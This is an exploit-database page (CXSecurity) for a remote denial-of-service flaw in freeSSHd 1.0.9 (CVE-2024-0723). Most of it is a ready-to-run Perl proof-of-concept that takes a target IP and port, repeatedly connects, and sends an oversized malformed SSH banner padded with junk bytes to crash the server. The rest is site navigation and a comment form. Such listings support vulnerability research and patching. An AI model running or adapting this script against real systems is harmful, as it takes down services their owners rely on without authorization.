---
title: freeSSHd 1.0.9 Denial of Service (DoS)
url: https://cxsecurity.com/issue/WLB-2025070038
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-01
fetch_date: 2025-10-07T00:14:52.486306
---

# freeSSHd 1.0.9 Denial of Service (DoS)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **freeSSHd 1.0.9 Denial of Service (DoS)** **2025.07.31**  Credit:  **[Fernando](https://cxsecurity.com/author/Fernando/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-0723](https://cxsecurity.com/cveshow/CVE-2024-0723/ "Click to see CVE-2024-0723")**  CWE: **[CWE-404](https://cxsecurity.com/cwe/CWE-404 "CWE-404")** | |

# Exploit Title: freeSSHd 1.0.9 - Denial of Service (DoS)
# Date: 2024-01-13
# Discovery by: Fernando Mengali
# Linkedin: https://www.linkedin.com/in/fernando-mengali/
# Software Link: https://www.exploit-db.com/apps/be82447d556d60db55053d658b4822a8-freeSSHd.exe
# Version: 1.0.9
# Tested on: Window XP Professional - Service Pack 2 and 3 - English
# Vulnerability Type: Denial of Service (DoS)
# Tested on: Windows XP - SP3 - English
# CVE: CVE-2024-0723
use IO::Socket;
#2. Proof of Concept - PoC
$sis="$^O";
if ($sis eq "windows"){
$cmd="cls";
} else {
$cmd="clear";
}
system("$cmd");
intro();
main();
print "[+] Exploiting... \n";
my $bufff =
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"x18;
my $payload =
"\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48" .
"\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde".("A" x 1067);
$payload .= $payload;
$payload .= "C" x 19021 . "\r\n";
my $i=0;
while ($i<=18) {
my $sock = IO::Socket::INET->new(
PeerAddr => $ip,
PeerPort => $port,
Proto => 'tcp'
) or die "Cannot connect!\n";
if (<$sock> eq '') {
print "[+] Done - Exploited success!!!!!\n\n";
exit;
}
$sock->send($payload) or die "Exploited successuful!!!";
$i++;
}
sub intro {
print q {
\_/|
// o\
|| .\_)
//\_\_\
)\_\_\_(
[+] freeSSHd 1.0.9 - Denial of Service (DoS)
[\*] Coded by Fernando Mengali
[@] e-mail: fernando.mengalli@gmail.com
}
}
sub main {
our ($ip, $port) = @ARGV;
unless (defined($ip) && defined($port)) {
print " \nUsage: $0 <ip> <port> \n";
exit(-1);
}
}

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025070038)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top